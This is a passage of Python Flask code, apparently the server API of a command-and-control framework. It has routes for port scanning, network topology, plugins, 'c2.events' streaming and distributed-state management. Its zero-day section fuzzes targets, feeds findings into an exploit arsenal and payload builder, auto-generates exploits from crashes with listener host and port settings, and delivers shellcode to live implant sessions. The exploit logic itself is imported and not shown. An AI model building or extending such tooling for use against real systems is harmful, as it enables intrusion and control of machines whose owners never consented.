@_require_permission("campaigns:write")
def graph_add_node():
    if not _threat_graph:
        return _err("Threat graph unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    node_id = body.get("node_id", "")
    kind    = body.get("kind", "ioc")
    if not node_id:
        return _err("node_id required.", status=400)
    _threat_graph.add_node(node_id, NodeKind(kind), body.get("data", {}))
    return jsonify({"node_id": node_id}), 201


@app.route("/api/intelligence/graph/edge", methods=["POST"])
@_require_permission("campaigns:write")
def graph_add_edge():
    if not _threat_graph:
        return _err("Threat graph unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    required = ("source_id", "target_id", "edge_type")
    for f in required:
        if not body.get(f):
            return _err(f"Missing: {f}", status=400)
    try:
        edge_id = _threat_graph.add_edge(
            source_id  = body["source_id"],
            target_id  = body["target_id"],
            edge_type  = EdgeType(body["edge_type"]),
            confidence = float(body.get("confidence", 0.7)),
            evidence   = body.get("evidence", ""),
        )
        return jsonify({"edge_id": edge_id}), 201
    except ValueError as e:
        return _err(str(e), status=400)


@app.route("/api/intelligence/graph/path")
@_require_permission("nodes:view")
def graph_path():
    if not _threat_graph:
        return _err("Threat graph unavailable.", status=503)
    src = request.args.get("src", "")
    dst = request.args.get("dst", "")
    if not src or not dst:
        return _err("src and dst required.", status=400)
    path = _threat_graph.shortest_path(src, dst)
    return jsonify({"path": path, "found": path is not None})


@app.route("/api/intelligence/graph/pagerank")
@_require_permission("nodes:view")
def graph_pagerank():
    if not _threat_graph:
        return _err("Threat graph unavailable.", status=503)
    scores = _threat_graph.pagerank()
    top    = sorted(scores.items(), key=lambda x: -x[1])[:20]
    return jsonify({"pagerank": dict(top), "total_nodes": len(scores)})


@app.route("/api/intelligence/graph/neighbors/<node_id>")
@_require_permission("nodes:view")
def graph_neighbors(node_id: str):
    if not _threat_graph:
        return _err("Threat graph unavailable.", status=503)
    direction = request.args.get("direction", "out")
    neighbors = _threat_graph.neighbors(node_id, direction=direction)
    return jsonify({"neighbors": neighbors, "count": len(neighbors)})


# ══════════════════════════════════════════════════════════════════════════════
# v11 — CONSENSUS ROUTES  /api/consensus/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/consensus/status")
@_require_permission("nodes:view")
def consensus_status():
    if not _CONSENSUS_AVAILABLE or not _raft_node:
        return jsonify({
            "available": _CONSENSUS_AVAILABLE,
            "running":   False,
            "note":      "Raft node not started (no peers configured)",
            "kv_store":  _kv_sm.stats() if _kv_sm else None,
        })
    return jsonify({
        "available": True,
        "running":   True,
        "raft":      _raft_node.status(),
        "kv_store":  _kv_sm.stats() if _kv_sm else None,
    })


@app.route("/api/consensus/kv/<key>", methods=["GET"])
@_require_permission("nodes:view")
def consensus_kv_get(key: str):
    if not _kv_sm:
        return _err("KV state machine unavailable.", status=503)
    val = _kv_sm.get(key)
    if val is None:
        return _err(f"Key '{key}' not found.", status=404)
    return jsonify({"key": key, "value": val})


@app.route("/api/consensus/kv/<key>", methods=["PUT", "POST"])
@_require_permission("campaigns:write")
def consensus_kv_set(key: str):
    if not _kv_sm:
        return _err("KV state machine unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    value = body.get("value")
    if value is None:
        return _err("value required.", status=400)
    # If raft running and we are leader, propose through raft
    if _raft_node and _raft_node.is_leader():
        ok, idx = _raft_node.propose({"op": "SET", "key": key, "value": value})
        if not ok:
            return _err("Not leader — redirect to leader.", status=503,
                        code="not_leader")
        return jsonify({"key": key, "value": value, "log_index": idx})
    # Fallback: apply directly (single node mode)
    _kv_sm._op_set({"key": key, "value": value})
    return jsonify({"key": key, "value": value, "log_index": -1})


@app.route("/api/consensus/kv/<key>", methods=["DELETE"])
@_require_permission("campaigns:write")
def consensus_kv_del(key: str):
    if not _kv_sm:
        return _err("KV state machine unavailable.", status=503)
    existed = _kv_sm._op_del({"key": key})
    return jsonify({"deleted": existed})


@app.route("/api/consensus/kv", methods=["GET"])
@_require_permission("nodes:view")
def consensus_kv_keys():
    if not _kv_sm:
        return _err("KV state machine unavailable.", status=503)
    prefix = request.args.get("prefix", "")
    return jsonify({"keys": _kv_sm.keys(prefix), "prefix": prefix})


@app.route("/api/consensus/propose", methods=["POST"])
@_require_permission("admin")
def consensus_propose():
    if not _raft_node:
        return _err("Raft node not running.", status=503)
    body = request.get_json(silent=True) or {}
    ok, idx = _raft_node.propose(body)
    if not ok:
        return _err("Not leader.", status=503, code="not_leader")
    return jsonify({"proposed": True, "log_index": idx})


# ══════════════════════════════════════════════════════════════════════════════
# v11 — NETWORK TOPOLOGY ROUTES  /api/network/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/network/topology")
@_require_permission("nodes:view")
def network_topology():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    return jsonify(_topology.to_dict())


@app.route("/api/network/topology/d3")
@_require_permission("nodes:view")
def network_topology_d3():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    return jsonify(_topology.to_d3_json())


@app.route("/api/network/topology/dot")
@_require_permission("nodes:view")
def network_topology_dot():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    dot = _topology.to_dot()
    return Response(dot, mimetype="text/plain")


@app.route("/api/network/node", methods=["POST"])
@_require_permission("nodes:command")
def network_add_node():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    if not body.get("ip"):
        return _err("ip required.", status=400)
    node = NetworkNode(
        node_id    = body.get("node_id", body["ip"].replace(".", "-")),
        ip         = body["ip"],
        hostname   = body.get("hostname"),
        open_ports = body.get("open_ports", []),
        services   = body.get("services", {}),
        tags       = body.get("tags", []),
        meta       = body.get("meta", {}),
    )
    _topology.add_node(node)
    emit("network.node_added", f"Node {node.ip} added to topology", "info")
    return jsonify({"node_id": node.node_id, "role": node.role.value}), 201


@app.route("/api/network/node/<node_id>", methods=["PATCH"])
@_require_permission("nodes:command")
def network_update_node(node_id: str):
    if not _topology:
        return _err("Network module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    ok = _topology.update_node(node_id, **{k: v for k, v in body.items()
                                            if k not in ("node_id",)})
    return jsonify({"updated": ok}) if ok else _err("Node not found.", status=404)


@app.route("/api/network/edge", methods=["POST"])
@_require_permission("nodes:command")
def network_add_edge():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    import uuid as _uuid
    edge = NetworkEdge(
        edge_id      = body.get("edge_id", str(_uuid.uuid4())),
        src_id       = body.get("src_id", ""),
        dst_id       = body.get("dst_id", ""),
        latency_ms   = float(body.get("latency_ms", 0)),
        bandwidth    = float(body.get("bandwidth", 0)),
        protocol     = body.get("protocol", ""),
        weight       = float(body.get("weight", 1.0)),
        bidirectional= body.get("bidirectional", True),
    )
    if not edge.src_id or not edge.dst_id:
        return _err("src_id and dst_id required.", status=400)
    _topology.add_edge(edge)
    return jsonify({"edge_id": edge.edge_id}), 201


@app.route("/api/network/path")
@_require_permission("nodes:view")
def network_path():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    src = request.args.get("src", "")
    dst = request.args.get("dst", "")
    if not src or not dst:
        return _err("src and dst required.", status=400)
    path = _topology.shortest_path(src, dst)
    return jsonify(path.to_dict() if path else {"error": "no path found", "path": None})


@app.route("/api/network/chokepoints")
@_require_permission("nodes:view")
def network_chokepoints():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    cps = _topology.find_chokepoints()
    return jsonify({"chokepoints": cps, "count": len(cps)})


@app.route("/api/network/components")
@_require_permission("nodes:view")
def network_components():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    comps = _topology.find_connected_components()
    return jsonify({"components": comps, "count": len(comps)})


@app.route("/api/network/subnet", methods=["POST"])
@_require_permission("nodes:command")
def network_add_subnet():
    if not _topology:
        return _err("Network module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    cidr = body.get("cidr", "")
    if not cidr:
        return _err("cidr required.", status=400)
    _topology.add_subnet(cidr)
    return jsonify({"cidr": cidr, "stats": _topology.stats()})


@app.route("/api/network/scan", methods=["POST"])
@_require_permission("nodes:command")
def network_scan():
    if not _NETWORK_AVAILABLE:
        return _err("Network module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    ip    = body.get("ip", "")
    ports = body.get("ports", [22, 80, 443, 3306, 5432, 6379, 8080, 8443])
    timing= body.get("timing", "normal")
    if not ip:
        return _err("ip required.", status=400)
    if len(ports) > 500:
        return _err("Max 500 ports per scan.", status=400)
    try:
        scanner = AsyncPortScanner(timing=timing, grab_banners=body.get("banners", False))
        results = scanner.scan(ip, ports)
        open_ports  = [r.to_dict() for r in results if r.state == PortState.OPEN]
        # Auto-add to topology
        if _topology and open_ports:
            node = NetworkNode(
                node_id    = ip.replace(".", "-"),
                ip         = ip,
                open_ports = [r["port"] for r in open_ports],
                services   = {r["port"]: r["service"] for r in open_ports},
            )
            _topology.add_node(node)
        emit("network.scan_complete", f"Scan of {ip}: {len(open_ports)} open ports", "info")
        return jsonify({"ip": ip, "open_ports": open_ports,
                        "total_scanned": len(results),
                        "open_count": len(open_ports)})
    except Exception as e:
        return _err(str(e), status=500)


# ══════════════════════════════════════════════════════════════════════════════
# v11 — PLUGIN ENGINE ROUTES  /api/plugins/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/plugins")
@_require_permission("nodes:view")
def plugins_list():
    if not _plugin_engine:
        return _err("Plugin engine unavailable.", status=503)
    status_filter = request.args.get("status")
    try:
        ps = PluginStatus(status_filter) if status_filter else None
    except ValueError:
        ps = None
    return jsonify({"plugins": _plugin_engine.list_plugins(status=ps),
                    "stats":   _plugin_engine.stats()})


@app.route("/api/plugins/<plugin_id>")
@_require_permission("nodes:view")
def plugins_get(plugin_id: str):
    if not _plugin_engine:
        return _err("Plugin engine unavailable.", status=503)
    p = _plugin_engine.get_plugin(plugin_id)
    return jsonify(p) if p else _err("Plugin not found.", status=404)


@app.route("/api/plugins/<plugin_id>/enable", methods=["POST"])
@_require_permission("admin")
def plugins_enable(plugin_id: str):
    if not _plugin_engine:
        return _err("Plugin engine unavailable.", status=503)
    ok = _plugin_engine.enable(plugin_id)
    _emit_audit("plugin.enabled", f"Plugin {plugin_id} enabled by {_operator()}")
    return jsonify({"enabled": ok}) if ok else _err("Plugin not found.", status=404)


@app.route("/api/plugins/<plugin_id>/disable", methods=["POST"])
@_require_permission("admin")
def plugins_disable(plugin_id: str):
    if not _plugin_engine:
        return _err("Plugin engine unavailable.", status=503)
    ok = _plugin_engine.disable(plugin_id)
    _emit_audit("plugin.disabled", f"Plugin {plugin_id} disabled by {_operator()}")
    return jsonify({"disabled": ok}) if ok else _err("Plugin not found.", status=404)


@app.route("/api/plugins/<plugin_id>/reload", methods=["POST"])
@_require_permission("admin")
def plugins_reload(plugin_id: str):
    if not _plugin_engine:
        return _err("Plugin engine unavailable.", status=503)
    ok = _plugin_engine.reload_plugin(plugin_id)
    _emit_audit("plugin.reloaded", f"Plugin {plugin_id} reloaded by {_operator()}")
    return jsonify({"reloaded": ok}) if ok else _err("Plugin not found.", status=404)


@app.route("/api/plugins/<plugin_id>/unload", methods=["POST"])
@_require_permission("admin")
def plugins_unload(plugin_id: str):
    if not _plugin_engine:
        return _err("Plugin engine unavailable.", status=503)
    ok = _plugin_engine.unload(plugin_id)
    return jsonify({"unloaded": ok}) if ok else _err("Plugin not found.", status=404)


@app.route("/api/plugins/stats")
@_require_permission("nodes:view")
def plugins_stats():
    if not _plugin_engine:
        return _err("Plugin engine unavailable.", status=503)
    return jsonify(_plugin_engine.stats())


# ══════════════════════════════════════════════════════════════════════════════
# v11 — STREAMING EVENT LOG ROUTES  /api/stream/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/stream/status")
@_require_permission("nodes:view")
def stream_status():
    return jsonify({
        "available": _STREAMING_AVAILABLE,
        "event_log": _event_log.stats() if _event_log else None,
        "projector": _projector.stats() if _projector else None,
    })


@app.route("/api/stream/events")
@_require_permission("nodes:view")
def stream_events():
    if not _event_log:
        return _err("Event log unavailable.", status=503)
    topic       = request.args.get("topic", "c2.events")
    start_offset= int(request.args.get("offset", 0))
    max_records = min(int(request.args.get("limit", 100)), 1000)
    records = _event_log.read(topic=topic, start_offset=start_offset,
                              max_records=max_records)
    return jsonify({
        "records": [r.to_dict() for r in records],
        "count":   len(records),
        "topic":   topic,
        "next_offset": records[-1].offset + 1 if records else start_offset,
    })


@app.route("/api/stream/events/tail")
@_require_permission("nodes:view")
def stream_tail():
    if not _event_log:
        return _err("Event log unavailable.", status=503)
    topic = request.args.get("topic", "c2.events")
    n     = min(int(request.args.get("n", 50)), 500)
    return jsonify({"records": [r.to_dict() for r in _event_log.tail(topic, n)],
                    "topic": topic})


@app.route("/api/stream/events/publish", methods=["POST"])
@_require_permission("campaigns:write")
def stream_publish():
    if not _event_log:
        return _err("Event log unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    topic      = body.get("topic", "c2.events")
    event_type = body.get("event_type", "")
    payload    = body.get("payload", {})
    if not event_type:
        return _err("event_type required.", status=400)
    offset = _event_log.write(topic=topic, event_type=event_type,
                              payload=payload, source=_operator())
    return jsonify({"offset": offset, "topic": topic}), 201


@app.route("/api/stream/projections")
@_require_permission("nodes:view")
def stream_projections():
    if not _projector:
        return _err("Projector unavailable.", status=503)
    return jsonify(_projector.stats())


@app.route("/api/stream/projections/<view_name>")
@_require_permission("nodes:view")
def stream_projection_query(view_name: str):
    if not _projector:
        return _err("Projector unavailable.", status=503)
    key = request.args.get("key")
    result = _projector.query(view_name, key=key)
    if result is None:
        return _err(f"View '{view_name}' not found.", status=404)
    return jsonify({"view": view_name, "key": key, "data": result})


@app.route("/api/stream/projections/<view_name>/rebuild", methods=["POST"])
@_require_permission("admin")
def stream_projection_rebuild(view_name: str):
    if not _projector:
        return _err("Projector unavailable.", status=503)
    ok = _projector.rebuild(view_name)
    return jsonify({"rebuilt": ok}) if ok else _err("View not found.", status=404)


# ══════════════════════════════════════════════════════════════════════════════
# v11 — SAGA ROUTES  /api/distributed/saga/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/distributed/saga", methods=["GET"])
@_require_permission("nodes:view")
def saga_list():
    if not _saga:
        return _err("Saga orchestrator unavailable.", status=503)
    saga_type = request.args.get("type")
    state_str = request.args.get("state")
    state = SagaState(state_str) if state_str else None
    return jsonify({"sagas": _saga.list_sagas(saga_type=saga_type, state=state),
                    "stats": _saga.stats()})


@app.route("/api/distributed/saga/<saga_id>")
@_require_permission("nodes:view")
def saga_get(saga_id: str):
    if not _saga:
        return _err("Saga orchestrator unavailable.", status=503)
    rec = _saga.get(saga_id)
    return jsonify(rec) if rec else _err("Saga not found.", status=404)


@app.route("/api/distributed/saga/stats")
@_require_permission("nodes:view")
def saga_stats():
    if not _saga:
        return _err("Saga orchestrator unavailable.", status=503)
    return jsonify(_saga.stats())


# ══════════════════════════════════════════════════════════════════════════════
# v11 — SERVICE REGISTRY ROUTES  /api/distributed/services/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/distributed/services", methods=["GET"])
@_require_permission("nodes:view")
def services_list():
    if not _svc_reg:
        return _err("Service registry unavailable.", status=503)
    return jsonify({"services": _svc_reg.list_services(),
                    "stats":    _svc_reg.stats()})


@app.route("/api/distributed/services/register", methods=["POST"])
@_require_permission("nodes:command")
def services_register():
    if not _svc_reg:
        return _err("Service registry unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    required = ("service_name", "address", "port")
    for f in required:
        if not body.get(f):
            return _err(f"Missing: {f}", status=400)
    import uuid as _uuid2
    svc = ServiceInstance(
        service_id   = body.get("service_id", str(_uuid2.uuid4())),
        service_name = body["service_name"],
        address      = body["address"],
        port         = int(body["port"]),
        tags         = body.get("tags", []),
        meta         = body.get("meta", {}),
        weight       = int(body.get("weight", 1)),
        ttl_seconds  = float(body.get("ttl_seconds", 30)),
        version      = body.get("version", ""),
    )
    sid = _svc_reg.register(svc)
    emit("service.registered", f"Service {svc.service_name}@{svc.address_port}", "info")
    return jsonify({"service_id": sid}), 201


@app.route("/api/distributed/services/<service_id>/heartbeat", methods=["POST"])
@_require_permission("nodes:command")
def services_heartbeat(service_id: str):
    if not _svc_reg:
        return _err("Service registry unavailable.", status=503)
    ok = _svc_reg.heartbeat(service_id)
    return jsonify({"ok": ok}) if ok else _err("Service not found.", status=404)


@app.route("/api/distributed/services/<service_id>/deregister", methods=["POST"])
@_require_permission("nodes:command")
def services_deregister(service_id: str):
    if not _svc_reg:
        return _err("Service registry unavailable.", status=503)
    ok = _svc_reg.deregister(service_id)
    if ok:
        emit("service.deregistered", f"Service {service_id} removed", "info")
    return jsonify({"deregistered": ok}) if ok else _err("Service not found.", status=404)


@app.route("/api/distributed/services/discover/<service_name>")
@_require_permission("nodes:view")
def services_discover(service_name: str):
    if not _svc_reg:
        return _err("Service registry unavailable.", status=503)
    strategy = request.args.get("strategy", "round_robin")
    tags     = request.args.getlist("tag")
    svc = _svc_reg.discover(service_name, strategy=strategy,
                            tags=tags or None,
                            state_filter=ServiceState.PASSING)
    if not svc:
        return _err(f"No healthy instances of '{service_name}'.", status=503)
    return jsonify(svc.to_dict())


@app.route("/api/distributed/services/discover/<service_name>/all")
@_require_permission("nodes:view")
def services_discover_all(service_name: str):
    if not _svc_reg:
        return _err("Service registry unavailable.", status=503)
    svcs = _svc_reg.discover_all(service_name)
    return jsonify({"instances": [s.to_dict() for s in svcs],
                    "count": len(svcs)})


# ══════════════════════════════════════════════════════════════════════════════
# v11 — ENHANCED FENCING ROUTES  /api/distributed/fencing/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/distributed/fencing/history")
@_require_permission("nodes:view")
def fencing_history():
    if not _fencing:
        return _err("Fencing unavailable.", status=503)
    resource = request.args.get("resource", "global")
    limit    = int(request.args.get("limit", 50))
    return jsonify({
        "history": _fencing.history(resource=resource, limit=limit),
        "stats":   _fencing.stats(),
    })


@app.route("/api/distributed/fencing/validate", methods=["POST"])
@_require_permission("nodes:command")
def fencing_validate():
    if not _fencing:
        return _err("Fencing unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    epoch    = body.get("epoch")
    resource = body.get("resource", "global")
    if epoch is None:
        return _err("epoch required.", status=400)
    try:
        _fencing.validate(int(epoch), resource=resource)
        return jsonify({"valid": True, "epoch": epoch, "resource": resource})
    except Exception as e:
        return jsonify({"valid": False, "reason": str(e), "epoch": epoch}), 409


@app.route("/api/distributed/fencing/retire", methods=["POST"])
@_require_permission("admin")
def fencing_retire():
    if not _fencing:
        return _err("Fencing unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    epoch    = body.get("epoch", _fencing.current_epoch)
    resource = body.get("resource", "global")
    ok = _fencing.retire_epoch(int(epoch), resource=resource)
    _emit_audit("fencing.retire", f"Epoch {epoch} retired by {_operator()}")
    return jsonify({"retired": ok})


# ══════════════════════════════════════════════════════════════════════════════
# v11 — WAL ENHANCED ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/distributed/wal/replay", methods=["POST"])
@_require_permission("admin")
def wal_replay():
    if not _wal:
        return _err("WAL unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    from_seq = int(body.get("from_seq", 0))
    max_entries = min(int(body.get("max_entries", 100)), 5000)
    entries = _wal.replay_from(seq=from_seq, max_entries=max_entries, verify=True)
    return jsonify({
        "entries": [e.to_dict() for e in entries],
        "count":   len(entries),
        "from_seq": from_seq,
    })


@app.route("/api/distributed/wal/checkpoint", methods=["POST"])
@_require_permission("admin")
def wal_checkpoint():
    if not _wal:
        return _err("WAL unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    cp_seq = _wal.checkpoint(reason=body.get("reason", f"manual:{_operator()}"))
    _emit_audit("wal.checkpoint", f"WAL checkpoint at seq={cp_seq} by {_operator()}")
    return jsonify({"checkpoint_seq": cp_seq, "stats": _wal.stats()})


@app.route("/api/distributed/wal/compact", methods=["POST"])
@_require_permission("admin")
def wal_compact():
    if not _wal:
        return _err("WAL unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    up_to = int(body.get("up_to_seq", _wal.last_checkpoint()))
    removed = _wal.compact_up_to(up_to)
    return jsonify({"removed_entries": removed, "stats": _wal.stats()})


# ══════════════════════════════════════════════════════════════════════════════
# v11 — COMPREHENSIVE SYSTEM STATUS
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/v11/system")
@_require_permission("nodes:view")
def v11_system():
    """v11 comprehensive system status — all subsystems."""
    return jsonify({
        "version": "12.0",
        "uptime":  time.time() - _BOOT_TIME,
        "subsystems": {
            "distributed": {
                "available": _DISTRIBUTED_AVAILABLE,
                "hlc":       _hlc.peek().to_dict() if _hlc else None,
                "wal":       _wal.stats() if _wal else None,
                "fencing":   _fencing.stats() if _fencing else None,
                "dlq":       _dlq.stats() if _dlq else None,
                "service_registry": _svc_reg.stats() if _svc_reg else None,
                "saga":      _saga.stats() if _saga else None,
            },
            "intelligence": {
                "available":  _INTELLIGENCE_AVAILABLE,
                "ioc":        _ioc_mgr.stats() if _ioc_mgr else None,
                "mitre":      _mitre.stats() if _mitre else None,
                "graph":      _threat_graph.stats() if _threat_graph else None,
            },
            "consensus": {
                "available": _CONSENSUS_AVAILABLE,
                "raft":      _raft_node.status() if _raft_node else None,
                "kv_sm":     _kv_sm.stats() if _kv_sm else None,
            },
            "network": {
                "available": _NETWORK_AVAILABLE,
                "topology":  _topology.stats() if _topology else None,
            },
            "plugins": {
                "available": _PLUGINS_AVAILABLE,
                "stats":     _plugin_engine.stats() if _plugin_engine else None,
            },
            "streaming": {
                "available": _STREAMING_AVAILABLE,
                "event_log": _event_log.stats() if _event_log else None,
                "projector": _projector.stats() if _projector else None,
            },
        },
    })



# ══════════════════════════════════════════════════════════════════════════════
# ZERO-DAY DISCOVERY API  /api/zeroday/*
# ══════════════════════════════════════════════════════════════════════════════

# Lazy-initialise the ZeroDay pipeline (reuses AEGIS audit + arsenal hooks)
_zd_pipeline = None
_zd_lock = __import__("threading").Lock()

def _get_zd_pipeline():
    global _zd_pipeline
    if _zd_pipeline is not None:
        return _zd_pipeline
    with _zd_lock:
        if _zd_pipeline is not None:
            return _zd_pipeline
        try:
            from zeroday.orchestrator import init_pipeline

            def _arsenal_push(data: dict) -> None:
                """Push auto-discovered finding into the exploit arsenal."""
                if _exploit_mgr:
                    try:
                        _exploit_mgr.create(data)
                    except Exception as _e:
                        log.debug("ZD arsenal push: %s", _e)

            def _payload_push(finding_dict: dict, operator: str) -> None:
                """Auto-build a payload from a Finding using the payload builder."""
                if _payload_builder:
                    try:
                        _payload_builder.from_finding(
                            finding     = finding_dict,
                            listener_id = "",          # no specific listener — generic
                            operator    = operator,
                            arch        = finding_dict.get("meta",{}).get("arch","x86_64"),
                        )
                    except Exception as _e:
                        log.debug("ZD payload push: %s", _e)

            def _ioc_push(ioc_list: list) -> None:
                """Push auto-discovered IOCs into the IOC manager."""
                if _ioc_mgr:
                    try:
                        from intelligence.ioc_manager import IOC, IOCType
                        for item in ioc_list:
                            ioc = IOC(
                                ioc_id      = "",
                                ioc_type    = IOCType(item.get("ioc_type","ip-address")),
                                value       = item["value"],
                                confidence  = float(item.get("confidence", 0.7)),
                                source      = item.get("source", "zeroday"),
                                tags        = item.get("tags", []),
                                description = item.get("description", ""),
                            )
                            _ioc_mgr.add(ioc)
                    except Exception as _e:
                        log.debug("ZD IOC push: %s", _e)

            def _session_deliver(session_id: str, payload_bytes: bytes) -> bool:
                """Deliver exploit shellcode directly to a live implant session."""
                try:
                    from listeners import get_manager
                    mgr = get_manager()
                    return mgr.send_to_session(session_id, payload_bytes)
                except Exception as _e:
                    log.debug("ZD session deliver: %s", _e)
                    return False

            _zd_pipeline = init_pipeline(
                audit_fn         = _emit_audit,
                arsenal_push_fn  = _arsenal_push  if _exploit_mgr      else None,
                payload_push_fn  = _payload_push  if _payload_builder   else None,
                ioc_push_fn      = _ioc_push      if _ioc_mgr           else None,
                session_deliver_fn = _session_deliver,
            )
            log.info("ZeroDay pipeline initialised — arsenal=%s payload=%s ioc=%s",
                      bool(_exploit_mgr), bool(_payload_builder), bool(_ioc_mgr))
        except ImportError as _e:
            log.warning("ZeroDay module unavailable: %s", _e)
            _zd_pipeline = None
    return _zd_pipeline


# ── Targets ────────────────────────────────────────────────────────────────

@app.route("/api/zeroday/targets", methods=["GET", "POST"])
@_require_permission("nodes:view")
def zd_targets():
    """List or register analysis targets."""
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)

    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        if not data.get("path") and not data.get("name"):
            return _err("'path' or 'name' required", status=400)
        try:
            from zeroday.models import Target, TargetType, TargetArch
            target = Target(
                name         = data.get("name", data.get("path", "")),
                path         = data.get("path", ""),
                target_type  = TargetType(data.get("type", "binary")),
                arch         = TargetArch(data.get("arch", "x86_64")),
                args         = data.get("args", []),
                env          = data.get("env", {}),
                stdin_mode   = bool(data.get("stdin_mode", False)),
                network_host = data.get("network_host"),
                network_port = data.get("network_port"),
                timeout_sec  = float(data.get("timeout_sec", 5.0)),
            )
            tid = pipeline.register_target(target)
            return jsonify({"target_id": tid, "name": target.name}), 201
        except Exception as e:
            return _err(str(e), status=400)

    return jsonify({"items": pipeline.list_targets(), "total": len(pipeline.list_targets())})


@app.route("/api/zeroday/targets/<target_id>/analyze", methods=["POST"])
@_require_permission("nodes:view")
def zd_analyze(target_id):
    """Run static analysis on a registered target."""
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    try:
        result = pipeline.run_static_analysis(target_id)
        return jsonify(result)
    except ValueError as e:
        return _err(str(e), status=404)
    except Exception as e:
        return _err(str(e), status=500)


# ── Campaigns ──────────────────────────────────────────────────────────────

@app.route("/api/zeroday/campaigns", methods=["GET", "POST"])
@_require_permission("nodes:view")
def zd_campaigns():
    """List or start fuzzing campaigns."""
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)

    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        target_id = data.get("target_id", "")
        if not target_id:
            return _err("'target_id' required", status=400)
        try:
            cid = pipeline.start_fuzzing(
                target_id      = target_id,
                max_duration_s = float(data.get("max_duration_s", 3600)),
                max_execs      = int(data.get("max_execs", 0)),
                seed_dir       = data.get("seed_dir"),
                fuzzer_name    = data.get("fuzzer", "custom"),
            )
            return jsonify({"campaign_id": cid}), 201
        except ValueError as e:
            return _err(str(e), status=404)
        except Exception as e:
            return _err(str(e), status=500)

    return jsonify({"items": pipeline.list_campaigns()})


@app.route("/api/zeroday/campaigns/<campaign_id>", methods=["GET"])
@_require_permission("nodes:view")
def zd_campaign_detail(campaign_id):
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    stats = pipeline.get_campaign_stats(campaign_id)
    if stats is None:
        return _err("Campaign not found", status=404)
    return jsonify(stats)


@app.route("/api/zeroday/campaigns/<campaign_id>/stop", methods=["POST"])
@_require_permission("nodes:view")
def zd_campaign_stop(campaign_id):
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    ok = pipeline.stop_fuzzing(campaign_id)
    return jsonify({"stopped": ok})


@app.route("/api/zeroday/campaigns/<campaign_id>/pause", methods=["POST"])
@_require_permission("nodes:view")
def zd_campaign_pause(campaign_id):
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    pipeline.pause_campaign(campaign_id)
    return jsonify({"paused": True})


@app.route("/api/zeroday/campaigns/<campaign_id>/resume", methods=["POST"])
@_require_permission("nodes:view")
def zd_campaign_resume(campaign_id):
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    pipeline.resume_campaign(campaign_id)
    return jsonify({"resumed": True})


# ── Crashes ────────────────────────────────────────────────────────────────

@app.route("/api/zeroday/crashes", methods=["GET"])
@_require_permission("nodes:view")
def zd_crashes():
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    campaign_id = request.args.get("campaign_id")
    crashes = pipeline.list_crashes(campaign_id)
    return jsonify({"items": crashes, "total": len(crashes)})


# ── Findings ───────────────────────────────────────────────────────────────

@app.route("/api/zeroday/findings", methods=["GET"])
@_require_permission("nodes:view")
def zd_findings():
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    findings = pipeline.list_findings()
    return jsonify({"items": findings, "total": len(findings)})


@app.route("/api/zeroday/findings/<finding_id>", methods=["GET"])
@_require_permission("nodes:view")
def zd_finding_detail(finding_id):
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    finding = pipeline.get_finding(finding_id)
    if finding is None:
        return _err("Finding not found", status=404)
    return jsonify(finding)


# ── Exploit generation ─────────────────────────────────────────────────────

@app.route("/api/zeroday/exploit/generate", methods=["POST"])
@_require_permission("tasks:create")
def zd_exploit_generate():
    """Auto-generate an exploit template from a crash."""
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    data      = request.get_json(silent=True) or {}
    crash_id  = data.get("crash_id", "")
    if not crash_id:
        return _err("'crash_id' required", status=400)
    result = pipeline.generate_exploit(
        crash_id = crash_id,
        lhost    = data.get("lhost", "127.0.0.1"),
        lport    = int(data.get("lport", 4444)),
    )
    if result is None:
        return _err("Crash not found", status=404)
    return jsonify(result)


# ── Reports ────────────────────────────────────────────────────────────────

@app.route("/api/zeroday/report", methods=["GET"])
@_require_permission("nodes:view")
def zd_report():
    """Generate a vulnerability report. ?format=json|markdown|html|csv"""
